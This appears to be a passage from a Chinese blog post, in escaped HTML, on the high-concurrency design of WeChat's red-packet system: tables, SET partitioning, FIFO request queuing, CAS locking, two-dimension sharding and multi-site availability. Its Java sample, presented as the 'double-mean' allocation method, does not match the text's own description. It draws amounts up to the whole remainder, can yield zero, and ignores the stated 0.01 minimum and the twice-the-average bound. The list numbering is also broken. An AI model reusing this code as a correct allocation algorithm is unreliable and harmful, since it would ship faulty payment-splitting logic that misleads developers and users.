的4大核心：摇&#x2F;发&#x2F;抢&#x2F;拆。</p>\n</li>\n</ol>\n<ul>\n<li><p>摇：摇的流畅</p>\n</li>\n<li><p>快：抢的要快</p>\n</li>\n<li><p>爽：拆的爽</p>\n</li>\n<li><p>稳：能分享出去</p>\n</li>\n</ul>\n<ol start=\"6\">\n<li><p><strong>数据一致性难点</strong>：</p>\n<p>红包系统需要保证数据的一致性，包括红包库存数据、用户账户数据等。如何在高并发场景下保证数据的一致性，是系统架构设计的重要挑战。</p>\n</li>\n</ol>\n<ul>\n<li><p>参与用户越多，并发 DB 请求越大，数据越容易出现事务问题，所以系统得做好<strong>事务一致性</strong>；</p>\n</li>\n<li><p>抢红包系统涉及金钱交易，所以事务级别要求更高，<strong>不能出现脏数据</strong>。</p>\n</li>\n</ul>\n<ol start=\"8\">\n<li><p><strong>系统扩展性难点</strong>：</p>\n<p>随着用户量和业务量的增长，红包系统需要具备良好的扩展性，能够方便地增加新的功能或提升性能。</p>\n<p>如何设计可扩展的系统架构，是系统架构设计的重要考虑因素。</p>\n<p>为了解决这些技术难点，我们可以采用多种技术手段，如分而治之、负载均衡、读写分离、水平切分、垂直切分等，来提升系统的性能和稳定性。同时，系统还采用了柔性服务、系统降级等策略，来保证在有限资源下满足用户的核心需求。</p>\n</li>\n</ol>\n<h3 id=\"红包系统概要设计\"><a href=\"#红包系统概要设计\" class=\"headerlink\" title=\"红包系统概要设计\"></a>红包系统概要设计</h3><h4 id=\"系统功能说明-1\"><a href=\"#系统功能说明-1\" class=\"headerlink\" title=\"系统功能说明\"></a>系统功能说明</h4><p>抢红包功能允许用户在群聊中发送任意个数和金额的红包，群成员可以抢到随机金额的红包，但要<strong>保证每个用户的红包金额不小于 0.01 元</strong>。</p>\n<p><img src=\"/./2024/05/28/%E7%99%BE%E4%BA%BF%E6%B5%81%E9%87%8F%E7%BA%A2%E5%8C%85%E7%B3%BB%E7%BB%9F/3.png\"><br>抢红包的详细交互流程如下：</p>\n<ol>\n<li><p>用户接收到抢红包通知，点击通知打开群聊页面；</p>\n</li>\n<li><p>用户点击抢红包，后台服务验证用户资格，确保用户尚未领取过此红包；</p>\n</li>\n<li><p>若用户资格验证通过，后台服务分配红包金额并存储领取记录；</p>\n</li>\n<li><p>用户在微信群中看到领取金额，红包状态更新为“已领取”；</p>\n</li>\n<li><p>异步调用支付接口，将红包金额更新到钱包里。</p>\n</li>\n</ol>\n<h2 id=\"数据库设计\"><a href=\"#数据库设计\" class=\"headerlink\" title=\"数据库设计\"></a>数据库设计</h2><p><strong>红包表：redpack</strong></p>\n<p>红包表用来记录用户发了多少红包，以及需要维护的剩余金额，</p>\n<p>红包表：redpack的字段如下：</p>\n<table>\n<thead>\n<tr>\n<th>字段</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>id</td>\n<td>主键，红包ID。</td>\n</tr>\n<tr>\n<td>user_id</td>\n<td>发送红包的用户id。</td>\n</tr>\n<tr>\n<td>total_amount</td>\n<td>红包总金额。</td>\n</tr>\n<tr>\n<td>surplus_amount</td>\n<td>红包剩余金额。</td>\n</tr>\n<tr>\n<td>total</td>\n<td>红包总数。</td>\n</tr>\n<tr>\n<td>surplus_total</td>\n<td>剩余红包总数。</td>\n</tr>\n</tbody></table>\n<p><strong>红包记录表：redpack_record</strong></p>\n<table>\n<thead>\n<tr>\n<th>字段</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>id</td>\n<td>主键，记录id。</td>\n</tr>\n<tr>\n<td>redpack_id</td>\n<td>红包id。</td>\n</tr>\n<tr>\n<td>user_id</td>\n<td>用户id。</td>\n</tr>\n<tr>\n<td>amount</td>\n<td>抢到的金额。</td>\n</tr>\n</tbody></table>\n<h4 id=\"发红包-1\"><a href=\"#发红包-1\" class=\"headerlink\" title=\"发红包\"></a>发红包</h4><p>设置完红包参数后，微信支付，完成付款，然后收到付款成功通知，红包系统更新红包订单状态，更新为已支付，并写入红包发送记录表。</p>\n<p>这样用户可以将用户的红包信息和红包的收发记录发出，红包系统调用微信通知，将红包信息发送到微信群。</p>\n<p>发红包的交互步骤如下：</p>\n<ol>\n<li><p>用户设置红包的总金额和个数后，在红包表中增加一条数据，开始发红包；</p>\n</li>\n<li><p>为了保证实时性和抢红包的效率，在 Redis 中增加一条记录，<strong>存储红包 ID 和总人数 n</strong>；</p>\n</li>\n<li><p>抢红包消息推送给所有群成员。</p>\n</li>\n</ol>\n<h4 id=\"抢红包-1\"><a href=\"#抢红包-1\" class=\"headerlink\" title=\"抢红包\"></a>抢红包</h4><p>微信群用户收到红包后，点开，红包系统会校验红包是否被抢完，是否过期。</p>\n<p>微信红包的抢红包和拆红包是两个分离的服务，用户点击抢红包后需要进行两次操作。</p>\n<p>这也是为什么明明有时候抢到了红包，点开后却发现<strong>该红包已经被领取完了</strong>。</p>\n<p>抢红包的交互步骤如下：</p>\n<ol>\n<li><p>抢红包：抢操作在 Redis 缓存层完成，通过原子递减的操作来更新红包个数，个数递减为 0 后就说明抢光了。</p>\n</li>\n<li><p>拆红包：拆红包时，首先会实时计算金额，一般是通过二倍均值法实现（即 0.01 到剩余平均值的 2 倍之间）。</p>\n</li>\n<li><p>红包记录：用户获取红包金额后，通过数据库的事务操作累加已经领取的个数和金额，并更新红包表和记录表。</p>\n</li>\n<li><p>转账：为了提升效率，最终的转账为异步操作，这也是为什么在春节期间，红包领取后不能立即在余额中看到的原因。</p>\n</li>\n</ol>\n<h2 id=\"红包系统详细设计\"><a href=\"#红包系统详细设计\" class=\"headerlink\" title=\"红包系统详细设计\"></a>红包系统详细设计</h2><h3 id=\"红包整体架构\"><a href=\"#红包整体架构\" class=\"headerlink\" title=\"红包整体架构\"></a>红包整体架构</h3><p>如下图所示，是微信红包的系统架构</p>\n<p><img src=\"/./2024/05/28/%E7%99%BE%E4%BA%BF%E6%B5%81%E9%87%8F%E7%BA%A2%E5%8C%85%E7%B3%BB%E7%BB%9F/4.png\"><br>总体是三层架构：</p>\n<ul>\n<li><p>首先是微信统一接入层，下面是微信红包系统 API，包括发、抢、拆、查红包详情、查红包用户列表。</p>\n</li>\n<li><p>接入层下面，是封装微信红包关键业务的逻辑服务；</p>\n</li>\n<li><p>业务下面数据存储层，微信红包最主要的数据是订单数据，包括发红包订单和拆红包订单两部分。</p>\n</li>\n</ul>\n<p>数据存储层的冷热分离设计：微信红包数据的访问热度，随着时间流逝会急剧降低，也就是数据的访问时间段非常集中，一般红包发出三天后，99% 的用户不会再去点开这个红包了。因此微信红包系统采取按时间做冷热数据分离，降低数据的存储成本，同时提升了热数据的访问性能。</p>\n<p>除了在线计算的三层架构，还有离线处理的数据分析。</p>\n<p>数据分析平台用于对红包数据的分析计算，比如朋友圈里的文章，统计从 某年 1 月 1 日到 2017 年 1 月一个用户总共抢红包的金额，在全国的排名情况，发红包数最多的城市等。</p>\n<p>数据分析平台另外一个作用就是对账，红包的订单和微信支付的订单需要对账，以保证最终资金的一致性；</p>\n<ul>\n<li><p>订单的数据和订单的 cache 需要做对账，以保证数据的完整性；</p>\n</li>\n<li><p>订单数据和用户的收发记录需要对账，以保证用户列表完整性。</p>\n</li>\n</ul>\n<h3 id=\"高并发常用解决方案\"><a href=\"#高并发常用解决方案\" class=\"headerlink\" title=\"高并发常用解决方案\"></a>高并发常用解决方案</h3><p>普通商品秒杀系统，解决高并发问题的方案，大致有以下2种：</p>\n<h3 id=\"1-使用内存替代实时的DB\"><a href=\"#1-使用内存替代实时的DB\" class=\"headerlink\" title=\"1- 使用内存替代实时的DB\"></a>1- 使用内存替代实时的DB</h3><p>将实时扣库存的行为上移到内存Cache中，内存Cache操作成功直接给Server返回成功，然后异步落DB持久化。</p>\n<p><img src=\"/./2024/05/28/%E7%99%BE%E4%BA%BF%E6%B5%81%E9%87%8F%E7%BA%A2%E5%8C%85%E7%B3%BB%E7%BB%9F/8.png\"><br>这个方案的优缺点如下：</p>\n<blockquote>\n<p>优点：用内存操作替代磁盘操作，提高了并发性能。</p>\n<p>缺点：在内存操作成功DB持久化失败，或者内存Cache故障的情况下，DB持久化会丢数据，不适合微信红包这种资金交易系统。</p>\n</blockquote>\n<h3 id=\"2-使用乐观锁替代悲观锁\"><a href=\"#2-使用乐观锁替代悲观锁\" class=\"headerlink\" title=\"2- 使用乐观锁替代悲观锁\"></a>2- 使用乐观锁替代悲观锁</h3><p><strong>什么是悲观锁呢？</strong></p>\n<p>所谓悲观锁，是关系数据库管理系统里的一种并发控制的方法。它可以阻止一个事务以影响其他用户的方式来修改数据。如果一个事务执行的操作对某行数据应用了锁，那只有当这个事务把锁释放，其他事务才能够执行与该锁冲突的操作。对应于上文分析中的“并发请求抢锁”行为。</p>\n<p><strong>什么是乐观锁呢？</strong></p>\n<p>所谓乐观锁，它假设多用户并发的事务在处理时不会彼此互相影响，各事务能够在不产生锁的情况下处理各自影响的那部分数据。在提交数据更新之前，每个事务会先检查在该事务读取数据后，有没有其他事务又修改了该数据。如果其他事务有更新的话，正在提交的事务会进行回滚。</p>\n<p>乐观锁分为DB乐观锁和 JVM CAS 乐观锁。</p>\n<p>DB乐观锁的具体应用方法，是在 DB 的“库存”记录中维护一个版本号。</p>\n<p>商品“秒杀”系统中，在更新“库存”的操作进行前，先去 DB 获取当前版本号。</p>\n<p>在更新库存的事务提交时，检查该版本号是否已被其他事务修改。如果版本没被修改，则提交事务，且版本号加 1；如果版本号已经被其他事务修改，则回滚事务，并给上层报错。</p>\n<p>DB乐观锁可以提高DB的并发处理能力，但是如果应用于微信红包系统，则会存在下面三个问题：</p>\n<ol>\n<li><p>如果拆红包采用乐观锁，那么在并发抢到相同版本号的拆红包请求中，只有一个能拆红包成功，其他的请求将事务回滚并返回失败，给用户报错，用户体验完全不可接受。</p>\n</li>\n<li><p>如果采用乐观锁，将会导致第一时间同时拆红包的用户有一部分直接返回失败，反而那些“手慢”的用户，有可能因为并发减小后拆红包成功，这会带来用户体验上的负面影响。</p>\n</li>\n<li><p>如果采用乐观锁的方式，会带来大数量的无效更新请求、事务回滚，给 DB 造成不必要的额外压力。</p>\n</li>\n</ol>\n<h4 id=\"JVM-CAS-乐观锁方案-1\"><a href=\"#JVM-CAS-乐观锁方案-1\" class=\"headerlink\" title=\"JVM CAS 乐观锁方案\"></a>JVM CAS 乐观锁方案</h4><p>出于性能原因，微信红包系统使用 JVM CAS 乐观锁，而不是DB乐观锁的方式解决并发抢锁问题。</p>\n<p>微信红包的金额是在拆红包时实时计算的，而不是预先分配的。系统会在拆红包时取0.01到剩余平均值*2之间的数值作为红包金额。</p>\n<p>这种实时计算的方式基于JVM 内存进行，不需要额外的存储空间，且计算效率很高。</p>\n<p>同时，为了保证操作的原子性，拆包过程中使用了CAS（Compare-and-Swap）算法，确保每次只有一个并发用户拆包成功。如果拆包CAS失败，系统会自动进行重试，但也可能在重试过程中被其他用户抢得先机而空手而归。</p>\n<p>如何保证同一个红包由同一个节点去拆包呢？将同一个红包 ID 的所有请求 stick 到同一台 Server，这个后面介绍。</p>\n<blockquote>\n<p>以上内容比较复杂，架构团队会录制成为架构视频， 帮助大家做架构拿高薪。</p>\n</blockquote>\n<h2 id=\"微信红包系统的高并发解决方案\"><a href=\"#微信红包系统的高并发解决方案\" class=\"headerlink\" title=\"微信红包系统的高并发解决方案\"></a>微信红包系统的高并发解决方案</h2><p>综合上面的分析，我们的红包系统针对相应的技术难点，采用如下3个方案，解决高并发问题。</p>\n<h5 id=\"1-分而治之：系统架构设计垂直Set化。-1\"><a href=\"#1-分而治之：系统架构设计垂直Set化。-1\" class=\"headerlink\" title=\"1- 分而治之：系统架构设计垂直Set化。\"></a>1- 分而治之：系统架构设计垂直Set化。</h5><p><strong>什么是Set（单元）化架构呢?</strong></p>\n<blockquote>\n<p>单元化架构是一种将系统划分为多个独立的、自包含的单元的部署架构，每个单元都能够完成所有业务操作，包含所有业务所需的服务以及分配给该单元的数据。这种架构将单元作为部署的基本单位，在全站所有机房中部署多个单元，每个机房内的单元数目不固定，但任一单元均部署系统所需的全部应用。数据则是全量数据按照某种维度划分后的一部分。与传统意义上的SOA（服务化）架构不同，单元化架构下，服务仍然是分层的，但每一层中的任意一个节点都属于且仅属于某一个单元，上层调用下层时，仅会选择本单元内的节点。</p>\n</blockquote>\n<p><strong>通俗的理解为</strong>：</p>\n<p>单元化架构，简单来说，就是把系统拆分成若干个独立的单元，每个单元都包含了完成业务操作所需的所有服务和数据。这些单元可以独立部署、管理和监控，就像一个个小房子，每个房子都有自己的客厅、卧室和厨房（服务），也有自己的食物和水（数据）。</p>\n<p>如下图，是一种单元化架构设计。</p>\n<p><img src=\"/./2024/05/28/%E7%99%BE%E4%BA%BF%E6%B5%81%E9%87%8F%E7%BA%A2%E5%8C%85%E7%B3%BB%E7%BB%9F/6.png\"></p>\n<p>微信红包用户发一个红包时，微信红包系统生成一个 ID 作为这个红包的唯一标识。</p>\n<p>接下来这个红包的所有发红包、抢红包、拆红包、查询红包详情等操作，都根据这个 ID 关联。</p>\n<p>红包系统根据这个红包 ID，按一定的规则（如按 ID 尾号取模等），垂直上下切分。</p>\n<p>切分后，一个垂直链条上的逻辑 Server 服务器、DB 统称为一个 SET。</p>\n<p>各个 SET 之间相互独立，互相解耦。并且同一个红包 ID 的所有请求，包括发红包、抢红包、拆红包、查详情详情等，垂直 stick 到同一个 SET 内处理，高度内聚。</p>\n<p>通过这样的方式，系统将所有红包请求这个巨大的洪流分散为多股小流，互不影响，分而治之，如下图所示。</p>\n<p><img src=\"/./2024/05/28/%E7%99%BE%E4%BA%BF%E6%B5%81%E9%87%8F%E7%BA%A2%E5%8C%85%E7%B3%BB%E7%BB%9F/7.png\"><br>这个方案解决了同时存在海量事务级操作的问题，将<strong>海量化为小量</strong>。</p>\n<h5 id=\"2-解决DB并发：逻辑Server层将请求排队。-1\"><a href=\"#2-解决DB并发：逻辑Server层将请求排队。-1\" class=\"headerlink\" title=\"2- 解决DB并发：逻辑Server层将请求排队。\"></a>2- 解决DB并发：逻辑Server层将请求排队。</h5><p>红包系统是资金交易系统，DB 操作的事务性无法避免，所以会存在“并发抢锁”问题。但是如果到达 DB 的事务操作（也即拆红包行为）不是并发的，而是串行的，就不会存在“并发抢锁”的问题了。</p>\n<p>按这个思路，为了使拆红包的事务操作串行地进入 DB，只需要将请求在 Server 层以 FIFO（先进先出）的方式排队，就可以达到这个效果。从而问题就集中到 Server 的 FIFO 队列设计上。</p>\n<p>红包系统设计了分布式的、轻巧的、灵活的 FIFO 队列方案。其具体实现如下：</p>\n<p><strong>1）将同一个红包 ID 的所有请求 stick 到同一台 Server。</strong></p>\n<p>上面 SET 化方案已经介绍，同个红包 ID 的所有请求，按红包 ID stick 到同个 SET 中。</p>\n<p>不过在同个 SET 中，会存在多台 Server 服务器同时连接同一台 DB（基于容灾、性能考虑，需要多台 Server 互备、均衡压力）。</p>\n<p>为了使同一个红包 ID 的所有请求，stick 到同一台 Server 服务器上，在 SET 化的设计之外，微信红包系统添加了一层基于红包 ID hash 值的分流，如下图所示。</p>\n<blockquote>\n<p>以上内容比较复杂，架构团队会录制成为架构视频， 帮助大家做架构拿高薪。</p>\n</blockquote>\n<p><strong>2）设计单机请求排队方案。</strong></p>\n<p>将 stick 到同一台 Server 上的所有请求在被接收进程接收后，按红包 ID 进行排队。</p>\n<p>然后串行地进入 worker 进程（执行业务逻辑）进行处理，从而达到排队的效果，如下图所示。</p>\n<p><img src=\"/./2024/05/28/%E7%99%BE%E4%BA%BF%E6%B5%81%E9%87%8F%E7%BA%A2%E5%8C%85%E7%B3%BB%E7%BB%9F/9.png\"><br><strong>3）增加 Redis缓存 控制并发。</strong></p>\n<p>为了防止 Server 中的请求队列过载导致队列被降级，从而所有请求拥进 DB，系统增加了与 Server 服务器同机部署的 Redis ，用于控制拆同一个红包的请求并发数。</p>\n<p>具体来说，利用 Redis 的 CAS 原子累增操作，控制同时进入 DB 执行拆红包事务的请求数，超过预先设定数值则直接拒绝服务。用于 DB 负载升高时的降级体验。</p>\n<p>通过以上三个措施，系统有效地控制了 DB 的“并发抢锁”情况。</p>\n<h5 id=\"3-系统性能稳定性保障：双维度分库分表设计。-1\"><a href=\"#3-系统性能稳定性保障：双维度分库分表设计。-1\" class=\"headerlink\" title=\"3- 系统性能稳定性保障：双维度分库分表设计。\"></a>3- 系统性能稳定性保障：双维度分库分表设计。</h5><p>红包系统的分库表规则，初期是根据红包 ID 的 hash 值分为多库多表。</p>\n<p>随着红包数据量逐渐增大，单表数据量也逐渐增加。而 DB 的性能与单表数据量有一定相关性。当单表数据量达到一定程度时，DB 性能会有大幅度下降，影响系统性能稳定性。</p>\n<p>采用冷热分离，将历史冷数据与当前热数据分开存储，可以解决这个问题。</p>\n<p>处理微信红包数据的冷热分离时，系统在以红包 ID 维度分库表的基础上，增加了以循环天分表的维度，形成了双维度分库表的特色。</p>\n<p>具体来说，就是分库表规则像 db_xx.t_y_dd 设计，其中，xx&#x2F;y 是红包 ID 的 hash 值后三位，dd 的取值范围在 01~31，代表一个月天数最多 31 天。</p>\n<p>通过这种双维度分库表方式，解决了 DB 单表数据量膨胀导致性能下降的问题，保障了系统性能的稳定性。同时，在热冷分离的问题上，又使得数据搬迁变得简单而优雅。</p>\n<p>综上所述，微信红包系统在解决高并发问题上的设计，主要采用了 <strong>SET 化分治</strong>、<strong>请求排队</strong>、<strong>双维度分库表</strong>等方案，使得单组 DB 的并发性能大幅度提升，取得了很好的效果。</p>\n<h4 id=\"红包分配算法-1\"><a href=\"#红包分配算法-1\" class=\"headerlink\" title=\"红包分配算法\"></a>红包分配算法</h4><p>抢红包后，我们需要进行拆红包，接下来我们讨论一下红包系统的红包分配算法。</p>\n<p>红包金额分配时，由于是随机分配，所以有两种实现方案：<strong>实时拆分和预先生成</strong></p>\n<h5 id=\"1-实时拆分-1\"><a href=\"#1-实时拆分-1\" class=\"headerlink\" title=\"1- 实时拆分\"></a>1- 实时拆分</h5><p>实时拆分，指的是在<strong>抢红包时实时计算</strong>每个红包的金额，以实现红包的拆分过程。</p>\n<p>这个对系统性能和拆分算法要求较高，例如拆分过程要一直保证后续待拆分红包的金额不能为空，不容易做到拆分的红包金额服从<strong>正态分布</strong>规律。</p>\n<h5 id=\"2-预先生成-1\"><a href=\"#2-预先生成-1\" class=\"headerlink\" title=\"2- 预先生成\"></a>2- 预先生成</h5><p>预先生成，指的是在红包<strong>开抢之前</strong>已经完成了红包的<strong>金额拆分</strong>，抢红包时只是依次取出拆分好的红包金额。</p>\n<p>这种方式对拆分算法要求较低，可以拆分出随机性很好的红包金额，但通常需要结合队列使用。</p>\n<h5 id=\"3-二倍均值法-1\"><a href=\"#3-二倍均值法-1\" class=\"headerlink\" title=\"3- 二倍均值法\"></a>3- 二倍均值法</h5><p>综合上述优缺点考虑，以及微信群聊中的人数不多（目前最高 500 人），所以我们采用实时拆分的方式，用<strong>二倍均值法</strong>来生成随机红包，只满足随机即可，不需要正态分布。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">使用二倍均值法生成的随机数，每次随机金额会在  0.01 ~ 剩余平均值\\*2 之间。  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>假设当前红包剩余金额为 10 元，剩余个数为 5，<strong>10&#x2F;5 &#x3D; 2</strong>，则当前用户可以抢到的红包金额为：<strong>0.01 ~ 4</strong> 元之间。</p>\n<p>以下是使用Java实现的二倍均值算法，在红包分配场景中。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">public class RedPacketDistribution &#123;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    public static List&lt;BigDecimal&gt; distribute(BigDecimal totalAmount, int totalCount) &#123;  </span><br><span class=\"line\">        // 校验总金额是否为正  </span><br><span class=\"line\">        if (totalAmount.compareTo(BigDecimal.ZERO) &lt;= 0) &#123;  </span><br><span class=\"line\">            throw new IllegalArgumentException(&quot;Invalid parameter, totalAmount must be positive.&quot;);  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">        // 校验红包总数是否至少为1  </span><br><span class=\"line\">        if (totalCount &lt; 1) &#123;  </span><br><span class=\"line\">            throw new IllegalArgumentException(&quot;Invalid parameter, totalCount must be at least 1.&quot;);  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">        List&lt;BigDecimal&gt; redPacketList = new ArrayList&lt;&gt;(totalCount);  </span><br><span class=\"line\">        BigDecimal remainingAmount = totalAmount.multiply(BigDecimal.valueOf(2)); // 初始化为总金额的两倍  </span><br><span class=\"line\">        ThreadLocalRandom random = ThreadLocalRandom.current(); // 使用线程安全的随机数生成器  </span><br><span class=\"line\">  </span><br><span class=\"line\">        for (int i = 0; i &lt; totalCount - 1; i++) &#123;  </span><br><span class=\"line\">            // 随机获取一个幸运值，范围在\\[0, 当前剩余金额)  </span><br><span class=\"line\">            BigDecimal luckValue = BigDecimal.valueOf(random.nextDouble()).multiply(remainingAmount);  </span><br><span class=\"line\">            // 计算并添加实际分配的红包金额（幸运值的一半）  </span><br><span class=\"line\">            BigDecimal amount = luckValue.divide(BigDecimal.valueOf(2), BigDecimal.ROUND\\_HALF\\_DOWN);  </span><br><span class=\"line\">            redPacketList.add(amount);  </span><br><span class=\"line\">            // 更新剩余金额  </span><br><span class=\"line\">            remainingAmount = remainingAmount.subtract(luckValue);  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">        // 最后一个红包直接拿走剩余的全部金额，确保总和正确  </span><br><span class=\"line\">        redPacketList.add(remainingAmount.divide(BigDecimal.valueOf(2), BigDecimal.ROUND\\_HALF\\_DOWN));  </span><br><span class=\"line\">  </span><br><span class=\"line\">        return redPacketList;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    public static void main(String\\[\\] args) &#123;  </span><br><span class=\"line\">        BigDecimal totalAmount = new BigDecimal(&quot;100.00&quot;); // 红包总金额  </span><br><span class=\"line\">        int totalCount = 10;      // 红包个数  </span><br><span class=\"line\">        List&lt;BigDecimal&gt; redPackets = distribute(totalAmount, totalCount);  </span><br><span class=\"line\">  </span><br><span class=\"line\">        System.out.println(&quot;Red packet distribution:&quot;);  </span><br><span class=\"line\">        for (BigDecimal amount : redPackets) &#123;  </span><br><span class=\"line\">            System.out.printf(&quot;%.2f, &quot;, amount);  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>以上内容比较复杂，架构团队会录制成为架构视频， 帮助大家做架构拿高薪。</p>\n</blockquote>\n<h2 id=\"红包系统高可用架构设计\"><a href=\"#红包系统高可用架构设计\" class=\"headerlink\" title=\"红包系统高可用架构设计\"></a>红包系统高可用架构设计</h2><p>红包业务量级的高速发展，对后台系统架构的可用性要求越来越高。在保障微信红包业务体验的前提下，红包后台系统进行了一系列高可用方面的优化设计。</p>\n<p>要保障红包系统架构的高可用性，可以从多个方面进行优化和设计。以下是一些详细说明：</p>\n<ol>\n<li><strong>系统架构设计</strong>：</li>\n</ol>\n<ul>\n<li><p><strong>信息流、业务流、资金流分离</strong>：红包系统由信息流、业务流、资金流三部分组成，这三部分在组织架构上应由不同的后台团队完成，以提高系统的模块化和可维护性。</p>\n</li>\n<li><p><strong>微服务架构</strong>：采用微服务架构，将红包系统拆分成多个独立的服务，每个服务负责特定的功能，这样可以提高系统的可扩展性和容错性。</p>\n</li>\n<li><p><strong>无状态设计</strong>：确保红包系统的服务是无状态的，即服务不需要保存用户的会话信息，这样可以提高系统的并发处理能力和可靠性。</p>\n</li>\n</ul>\n<ol start=\"3\">\n<li><strong>高可用性策略</strong>：</li>\n</ol>\n<ul>\n<li><p><strong>冗余部署</strong>：将系统的关键组件部署在多台服务器上，通过搭建主备或者集群的架构来实现冗余。当主服务器出现故障时，备用服务器能够自动接管，保证系统的可用性。</p>\n</li>\n<li><p><strong>负载均衡</strong>：通过将流量分发到多台服务器上，均衡系统的请求负载，提高系统的可用性和扩展性。负载均衡可以通过硬件（如负载均衡器）或者软件（如Nginx、HAProxy）实现。</p>\n</li>\n<li><p><strong>服务容器化</strong>：使用容器技术（如Docker、Kubernetes）将应用程序与其依赖项打包为容器，实现快速部署、弹性扩展和自动化管理。容器化可以提高系统的可移植性、弹性和可伸缩性，从而增加系统的高可用性。</p>\n</li>\n</ul>\n<ol start=\"5\">\n<li><strong>数据保障</strong>：</li>\n</ol>\n<ul>\n<li><p><strong>数据备份与恢复</strong>：定期对关键数据进行备份，并确保备份的数据可用性。这样，在发生数据丢失或损坏时，可以快速恢复数据，减少系统停机时间。</p>\n</li>\n<li><p><strong>分布式缓存</strong>：使用多级缓存技术（如Redis、Memcached等），将数据分别存储在内存缓存、本地缓存和分布式缓存中，以提高访问速度和降低数据库压力。</p>\n</li>\n<li><p><strong>数据一致性</strong>：使用分布式锁技术来保护红包的领取操作，确保每个用户只能领取一次红包。同时，为了保证数据一致性，可以采用消息队列等技术实现请求的异步处理和结果的返回。</p>\n</li>\n</ul>\n<ol start=\"7\">\n<li><strong>监控与告警</strong>：</li>\n</ol>\n<ul>\n<li><p><strong>系统监控</strong>：对红包系统的关键指标（如请求量、响应时间、错误率等）进行实时监控，以便及时发现和解决潜在问题。</p>\n</li>\n<li><p><strong>告警机制</strong>：设置合理的告警阈值，当系统出现异常情况时，及时发送告警通知给相关人员，以便快速响应和处理。</p>\n</li>\n</ul>\n<ol start=\"9\">\n<li><p><strong>安全性保障</strong>：</p>\n<p>通过以上措施的综合应用，可以大大提高红包系统架构的高可用性，确保系统在高峰时段能够稳定、高效地运行。</p>\n</li>\n</ol>\n<ul>\n<li><p><strong>访问控制</strong>：实施严格的访问控制策略，确保只有授权的用户才能访问红包系统。</p>\n</li>\n<li><p><strong>数据加密</strong>：对敏感数据进行加密存储和传输，以防止数据泄露和篡改。</p>\n</li>\n<li><p><strong>安全审计</strong>：定期对红包系统进行安全审计和漏洞扫描，及时修复发现的安全漏洞和隐患。</p>\n</li>\n</ul>\n<h4 id=\"1-系统可用性影响因素-1\"><a href=\"#1-系统可用性影响因素-1\" class=\"headerlink\" title=\"1 - 系统可用性影响因素\"></a>1 - 系统可用性影响因素</h4><p><strong>系统的可用性影响因素可分成两类：</strong></p>\n<ul>\n<li><p>一类计划外；</p>\n<p>计划外包含很多因素，系统用到的所有东西都可能产生故障，都可能成功影响可用性的因素。从这个角度上来讲，可以说故障是无法避免的，系统的运作一定会产生故障，尤其是服务器有成千上万个的时候。</p>\n</li>\n<li><p>一类计划内。</p>\n<p>计划内的影响因素，主要有与升级相关、运维相关的操作，以及日常的备份等。这一类影响因素，通过精细地设计方案，是可以避免对可用性造成影响的。</p>\n</li>\n</ul>\n<h4 id=\"2-红包系统可用性设计方向-1\"><a href=\"#2-红包系统可用性设计方向-1\" class=\"headerlink\" title=\"2 - 红包系统可用性设计方向\"></a>2 - 红包系统可用性设计方向</h4><p>基于上面两个分析结论，可以总结出红包系统的可用性的设计方向。</p>\n<blockquote>\n<p>1.在不能避免意外故障的情况下，尽可能降低出现意外故障时对可用性的影响。</p>\n<p>2.绝大多数计划内的日常维护可以通过方案的设计避免影响可用性，其中平行扩容特指关于存储层的平行扩容。</p>\n</blockquote>\n<p>下面从降低故障影响和微信红包系统的平行扩容两方面进行分析。</p>\n<p>首先是降低意外故障的影响，重点讲解订单存储层在订单 DB 故障的情况下如何降低对红包系统可用性的影响。</p>\n<h4 id=\"3-业务逻辑层-部署方案设计-1\"><a href=\"#3-业务逻辑层-部署方案设计-1\" class=\"headerlink\" title=\"3 - 业务逻辑层 - 部署方案设计\"></a>3 - 业务逻辑层 - 部署方案设计</h4><p>首先是业务逻辑层的部署方案。业务逻辑层是无状态的，微信红包系统的业务逻辑层，部署在两个城市，即两地部署，每一个城市部署至少三个园区，即三个 IDC。并且每个服务需要保证三个 IDC 的部署均衡。另外，三个 IDC 总服务能力需要冗余三分之一，当一个 IDC 出现故障时，服务能力仍然足够。从而达到 IDC 故障不会对可用性产生影响。</p>\n<h4 id=\"4-业务逻辑层-异步化设计-1\"><a href=\"#4-业务逻辑层-异步化设计-1\" class=\"headerlink\" title=\"4 - 业务逻辑层 - 异步化设计\"></a>4 - 业务逻辑层 - 异步化设计</h4><p>如下图所示，微信红包的某些步骤不实时完成也不会影响用户对红包业务可用性的体验。</p>\n<p>比如拆红包，正常的业务流程很长，但关键步骤只有订单相关的几步。</p>\n<p>至于转零钱、写红包记录等操作不需要实时。</p>\n<p>用户抢到红包时，一般不会实时去钱包查看微信零钱，而是在微信群中点开消息查看本次抢到金额和他人抢红包金额。</p>\n<p>所以拆红包时只需要从 cache 查询用户是否拆过红包，然后写入拆红包的订单记录，更新发红包订单，其他的操作都可以异步化。</p>\n<p>当然，不是每个业务都可以进行异步化设计，需要进行业务分析，判断是否存在非关键步骤之外的事情可以将其异步化，并通过异步对账保证最终一致。</p>\n<p>经过上述分析之后，可以采用如下思路与方案：</p>\n<blockquote>\n<p>实现思路：</p>\n<p>1.最简关键路径：简化发红包、拆红包核心流程路径，重点关注与订单相关流程。</p>\n<p>2.快慢分离：将核心流程与其他非关键步骤分离。</p>\n<p>方案：</p>\n<p>1.写用户记录、零钱入账使用MQ异步执行</p>\n<p>2.增加对帐机制保障最终一致。</p>\n</blockquote>\n<p><img 